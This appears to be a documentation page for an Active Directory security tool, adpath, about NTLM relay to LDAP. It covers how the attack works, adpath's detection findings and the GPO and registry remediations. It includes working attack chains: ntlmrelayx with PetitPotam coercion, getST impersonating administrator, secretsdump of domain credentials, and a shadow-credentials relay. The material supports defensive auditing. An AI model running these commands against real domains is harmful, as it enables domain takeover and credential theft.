# LDAP Relay

**MITRE:** T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)

## How it works

NTLM relay to LDAP is one of the most impactful network-layer attacks against Active Directory. It works when:

1. **LDAP signing is not enforced** — the DC accepts unsigned LDAP connections
2. **LDAP channel binding is not enforced** — the DC doesn't verify the TLS channel matches the NTLM authentication

An attacker can coerce a machine (e.g. a DC) to authenticate to them using NTLM (via PetitPotam, PrintSpooler abuse, or Responder), then **relay** that authentication to LDAP on another DC. If the coerced machine has rights in AD (a DC always does), the attacker gets an authenticated LDAP session with those rights.

```
Attacker ──coerce──→ DC01: authenticate to me (NTLM)
DC01 ──NTLM auth──→ Attacker
Attacker ──relay──→ DC02 LDAP: I am DC01 (NTLM forwarded)
DC02: authenticated session as DC01$
Attacker: add shadow credential on DC02 → DCSync
```

## What makes LDAP relay possible

| Requirement | Default state |
|-------------|---------------|
| LDAP signing not required | ✓ Default until Windows Server 2022 |
| LDAP channel binding not required | ✓ Default in most environments |
| NTLM coercion possible (PetitPotam, etc.) | ✓ Often enabled |

## Detection with adpath

adpath checks LDAP security in `enum` and via the LDAP Security tab in the HTML report:

```bash
adpath enum -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

Findings reported:

| Finding | Condition |
|---------|-----------|
| **LDAP signing not enforced** (Medium) | Authentication succeeded over port 389 without signing |
| **LDAP channel binding not advertised** (Medium) | OID `1.2.840.113556.1.4.1791` absent in supportedCapabilities |
| **NTLM/Kerberos SASL available over plain LDAP** (Low) | GSS-SPNEGO or GSSAPI listed on port 389 |
| **Anonymous LDAP read enabled** (Medium) | Anonymous bind can read AD objects beyond RootDSE |

## Exploit chain (NTLM relay → RBCD)

```bash
# Step 1: Set up relay (ntlmrelayx)
ntlmrelayx.py -t ldap://dc02.corp.local --delegate-access

# Step 2: Coerce NTLM auth from DC01 (PetitPotam)
PetitPotam.py attacker-ip dc01.corp.local

# ntlmrelayx creates a computer account and sets RBCD on DC02

# Step 3: Get a service ticket impersonating administrator
getST.py -spn cifs/dc02.corp.local corp.local/ATTACKERPC\$ \
  -impersonate administrator -hashes :machineNTHash

# Step 4: Access
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass administrator@dc02.corp.local
```

## Exploit chain (NTLM relay → Shadow Credentials)

```bash
# ntlmrelayx with shadow credentials mode
ntlmrelayx.py -t ldaps://dc02.corp.local --shadow-credentials --shadow-target 'dc02$'
```

## Remediation

**Enforce LDAP signing** (GPO):

- Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
- **Domain controller: LDAP server signing requirements** → `Require signing`
- **Network security: LDAP client signing requirements** → `Require signing`

**Enforce LDAP channel binding** (Registry on each DC):

```
HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
LdapEnforceChannelBinding = 2
```

Or via GPO: **Domain controller: LDAP server channel binding token requirements** → `Always` (requires KB4520412)

**Disable NTLM coercion paths:**

- Disable `MS-EFSRPC` unauthenticated calls: KB5005413
- Disable Print Spooler on DCs: `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`
- Enable EPA (Extended Protection for Authentication) on IIS/Exchange

## References

- [Microsoft ADV190023 — LDAP channel binding and signing](https://msrc.microsoft.com/update-guide/vulnerability/ADV190023)
- [KB4520412 — Updates to LDAP channel binding](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a)
- [PetitPotam](https://github.com/topotam/PetitPotam)
